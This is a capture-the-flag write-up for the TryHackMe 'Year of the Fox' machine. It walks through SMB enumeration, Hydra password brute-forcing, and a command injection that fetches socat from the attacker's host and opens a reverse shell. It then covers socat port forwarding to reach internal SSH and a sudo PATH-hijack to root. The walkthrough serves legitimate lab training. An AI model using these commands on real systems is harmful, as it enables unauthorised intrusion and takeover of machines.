# Year of the Fox — CTF Writeup

> **Platform:** TryHackMe
> **Difficulty:** Hard

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Getting the Foothold (Web & RCE)](#2-getting-the-foothold-web--rce)
3. [Lateral Movement (Moving to user fox)](#3-lateral-movement-moving-to-user-fox)
4. [Privilege Escalation (Getting Root)](#4-privilege-escalation-getting-root)

---

## 1. Reconnaissance

To save time, I didn't jump straight into a slow Nmap scan. Instead, I started with **Rustscan** to blast through all ports fast, and then piped the open ports into Nmap with default scripts and version detection:

```bash
rustscan -a 10.130.174.130 -- -sC -sV -oN nmap_scan.txt
```

The scan showed two interesting things: a web server on **port 80** and open **SMB ports (139/445)**.

Let's check the web server first. Visiting `http://10.130.174.130` immediately prompts for an HTTP Basic Authentication popup (username & password). There's nothing else to see on the page without creds.

Since SMB is open, let's switch gears and enumerate it using **enum4linux**:

```bash
enum4linux -a 10.130.174.130
```

Checking the output, we find two key pieces of information:

- A share named **`yotf`** labeled with a message saying *"Fox's stuff - Keep out!"*
- Two local usernames on the box: **`fox`** and **`rascal`**

---

## 2. Getting the Foothold (Web & RCE)

Now that we have usernames, let's go back to that web login popup. Trying to brute-force the SMB share directly would be slow, so let's try hitting the HTTP login with **Hydra** using the username `rascal` and the `rockyou.txt` wordlist:

```bash
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.130.174.130 http-head /
```

Boom, Hydra cracked the password!

Logging into the web page, we get a simple search form that searches for files. Testing input here showed some client-side filters (JavaScript blocking certain special characters). We can easily bypass that by intercepting the request with **Burp Suite Repeater**.

Sending a simple test like `test; ping -c 1 <MY_IP>` through Burp confirmed **command injection**, but normal reverse shells (`bash`, `nc`) kept failing — the server was blocking spaces and standard payload characters.

### Introducing socat

After some research, I found an awesome tool called **socat**.

> **What is socat?**
> Think of `socat` like Netcat on steroids. It connects two data streams together (like a network port and your terminal). Unlike basic netcat, socat can give you a fully interactive, stable TTY shell right out of the box without breaking when weird characters or keys (like `Ctrl+C`) are used.

To get around the shell restrictions, I hosted a compiled `socat` binary on my machine:

```bash
python3 -m http.server 80
```

Then I used the command injection in Burp to download it to `/tmp` and make it executable:

```bash
;curl http://<MY_IP>/socat -o /tmp/socat;chmod +x /tmp/socat;
```

Started my listener on my attacking machine:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

And fired the shell payload through Burp:

```bash
;/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<MY_IP>:4444;
```

It caught immediately! A full, stable TTY shell as **`www-data`**.

We can grab the first flag right away:

```bash
cat /var/www/flag1.txt
```

---

## 3. Lateral Movement (Moving to user fox)

Looking around the system, nothing obvious jumped out, so I checked internal network connections:

```bash
netstat -tlpn
# or: ss -tulpn
```

Sure enough, **port 22 (SSH)** was listening, but only internally on `127.0.0.1:22` (localhost)! Checking `/etc/ssh/sshd_config`, there was a line saying:

```
AllowUsers fox
```

So SSH is running, but hidden from the outside — and only user `fox` can log in.

Since we already have `socat` on the machine, we can use it to **forward the internal port 22** to a public port like `8888`:

```bash
/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:22 &
```

Now the machine's internal SSH is reachable on port `8888` from our machine. Let's brute-force the password for `fox` using Hydra:

```bash
hydra -l fox -P /usr/share/wordlists/rockyou.txt -s 8888 10.130.174.130 ssh
```

It cracked! Now we can SSH directly:

```bash
ssh -p 8888 fox@10.130.174.130
```

Grab the user flag:

```bash
cat ~/user.txt
```

---

## 4. Privilege Escalation (Getting Root)

Now for root. First command I always run:

```bash
sudo -l
```

The output showed:

```
User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

We can run `/usr/sbin/shutdown` as root without a password. But shutting down the machine does nothing for us — so let's dig deeper.

Let's check the strings inside that binary:

```bash
strings /usr/sbin/shutdown | grep poweroff
```

It shows it runs `poweroff`. But look closely: it calls `poweroff` **directly**, not with a full path like `/sbin/poweroff`!

When a program calls a command like that, it looks through the directories listed in your `$PATH` variable to find it. Normally, `sudo` prevents this by forcing a clean `secure_path`. But checking our `sudo -l` output again — **`secure_path` was completely missing!**

This means we can hijack the command using **PATH manipulation**:

**Step 1:** Create a fake script named `poweroff` inside `/tmp` that spawns a bash shell:

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/poweroff
chmod +x /tmp/poweroff
```

**Step 2:** Run the shutdown binary with `sudo`, but put `/tmp` at the very front of `$PATH`:

```bash
sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown
```

Because `/tmp` was checked first, it ran our fake script instead of the real `poweroff` command — giving us an **instant root shell**!

---

## The Final Flag

Checking `/root/root.txt` gave a troll message. To find where the author hid the real one, let's search for files owned by root's group inside `/home`:

```bash
find /home -group root 2>/dev/null
```

Found it hidden in a folder inside `/home`. Grabbed the root flag, and the box is finished! 🦊
